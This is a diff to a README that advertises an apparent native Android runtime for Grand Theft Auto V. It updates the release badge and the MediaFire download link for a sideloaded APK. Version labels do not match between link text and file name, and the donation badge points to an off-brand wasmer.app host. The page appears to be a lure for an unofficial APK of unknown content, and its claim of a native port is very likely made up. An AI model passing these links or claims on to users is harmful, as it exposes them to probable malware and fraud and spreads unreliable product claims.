@@ -3,7 +3,7 @@
 [![Platform: Android](https://img.shields.io/badge/Platform-Android%208.0%2B-green.svg)](https://android.com)
 [![Architecture: ARM64](https://img.shields.io/badge/Arch-arm64--v8a-blue.svg)](https://developer.android.com/ndk)
 [![Graphics: Vulkan](https://img.shields.io/badge/Graphics-Vulkan%201.1%2B-orange.svg)](https://www.vulkan.org/)
-[![Release: v2.4.1](https://img.shields.io/badge/Release-v2.4.1-gold.svg)](https://www.mediafire.com/file/pz1gpk4tvrpmgw3/GTA_V_v2.4.1_Release.apk/file)
+[![Release: v3.0.0](https://img.shields.io/badge/Release-v3.0.0-gold.svg)](https://www.mediafire.com/file/neclmrxam0pq7az/GTA_V_v3.0.9_Release.apk/file)
 [![Donate: Buy Me A Coffee](https://img.shields.io/badge/Donate-Buy%20Me%20A%20Coffee-yellow.svg?logo=buy-me-a-coffee)](https://buy-me-coffee.wasmer.app/)
 
 A native Android launcher and engine runtime for Grand Theft Auto V, engineered from the ground up for modern 64-bit ARM mobile devices with Vulkan hardware acceleration, console-grade controller support, and intelligent performance optimization.
@@ -33,7 +33,7 @@ A native Android launcher and engine runtime for Grand Theft Auto V, engineered 
 ## 📲 Download & Installation
 
 ### Direct Download Link
-👉 **[Download GTAV_Android_v2.4.1_arm64.apk (MediaFire)](https://www.mediafire.com/file/pz1gpk4tvrpmgw3/GTA_V_v2.4.1_Release.apk/file)**
+👉 **[Download GTAV_Android_v3.0.0_arm64.apk (MediaFire)](https://www.mediafire.com/file/neclmrxam0pq7az/GTA_V_v3.0.9_Release.apk/file)**
 
 ---
 
